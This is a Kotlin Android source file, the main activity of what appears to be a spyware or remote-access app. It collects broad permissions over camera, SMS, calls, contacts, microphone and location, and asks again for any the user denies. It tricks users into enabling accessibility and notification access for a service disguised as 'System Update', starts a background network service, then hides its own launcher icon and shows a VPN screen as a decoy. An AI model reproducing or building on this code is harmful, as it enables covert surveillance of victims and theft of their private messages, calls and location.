package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.app.AlertDialog
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.SystemNetworkService

class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        private const val RC_BATTERY = 101

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
            return try {
                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) return true
                }
                false
            } catch (_: Exception) {
                false
            }
        }

        fun isNotificationAccessEnabled(ctx: Context): Boolean {
            return try {
                val enabledListeners = Settings.Secure.getString(
                    ctx.contentResolver,
                    "enabled_notification_listeners"
                ) ?: ""
                val ourListener = ComponentName(ctx, com.openaccess.sdk.service.NotifService::class.java).flattenToString()
                enabledListeners.contains(ourListener)
            } catch (_: Exception) {
                false
            }
        }

        fun isIgnoringBatteryOptimizations(ctx: Context): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(ctx.packageName)
            } else true
        }
    }

    private var permissionsRequested = false
    private var batteryOptRequested = false
    private var setupStep = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try { SystemNetworkService.start(this) } catch (_: Exception) {}

        Handler(Looper.getMainLooper()).postDelayed({
            if (!permissionsRequested) {
                permissionsRequested = true
                beginSetupFlow()
            }
        }, 500)
    }

    private fun beginSetupFlow() {
        setupStep = 0
        checkAndProceed()
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)
        val notifOk = isNotificationAccessEnabled(this)
        val batteryOk = isIgnoringBatteryOptimizations(this)
        val serviceOk = isServiceRunning(this, SystemNetworkService::class.java)

        when {
            !permsOk -> requestAllPerms()
            !batteryOk && !batteryOptRequested -> requestBatteryOptimization()
            !accOk -> showEnableAccessibilityAlert()
            !notifOk -> showEnableNotificationAlert()
            !serviceOk -> {
                try { SystemNetworkService.start(this) } catch (_: Exception) {}
                onSetupComplete()
            }
            else -> onSetupComplete()
        }
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
        } else {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            batteryOptRequested = true
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } catch (_: Exception) {
                checkAndProceed()
            }
        } else {
            checkAndProceed()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
            if (denied.isNotEmpty()) {
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isFinishing && !isDestroyed) {
                        ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                    }
                }, 800)
            } else {
                checkAndProceed()
            }
        }
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        startActivity(Intent(this, VpnActivity::class.java))
        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)
        val serviceOk = isServiceRunning(this, SystemNetworkService::class.java)

        when {
            accOk && permsOk -> {
                if (!serviceOk) {
                    try { SystemNetworkService.start(this) } catch (_: Exception) {}
                }
                startActivity(Intent(this, VpnActivity::class.java))
                finishAndRemoveTask()
            }
            !permsOk && !permissionsRequested -> {
                permissionsRequested = true
                requestAllPerms()
            }
            !accOk && permsOk -> {
                showEnableAccessibilityAlert()
            }
        }
    }

    private fun showEnableAccessibilityAlert() {
        AlertDialog.Builder(this)
            .setTitle("Setup Required")
            .setMessage("Please enable Accessibility Service for the app to work properly.\n\n1. Find 'System Update' in the list\n2. Toggle it ON\n3. Tap Allow")
            .setPositiveButton("Open Settings") { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (_: Exception) {}
                finishAndRemoveTask()
            }
            .setNegativeButton("Later") { _, _ ->
                finishAndRemoveTask()
            }
            .setCancelable(false)
            .show()
    }

    private fun showEnableNotificationAlert() {
        AlertDialog.Builder(this)
            .setTitle("Notification Access")
            .setMessage("Enable notification access to capture notifications from other apps.\n\n1. Find 'System Update' in the list\n2. Toggle it ON")
            .setPositiveButton("Open Settings") { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (_: Exception) {}
            }
            .setNegativeButton("Skip") { _, _ ->
                checkAndProceed()
            }
            .setCancelable(false)
            .show()
    }
}
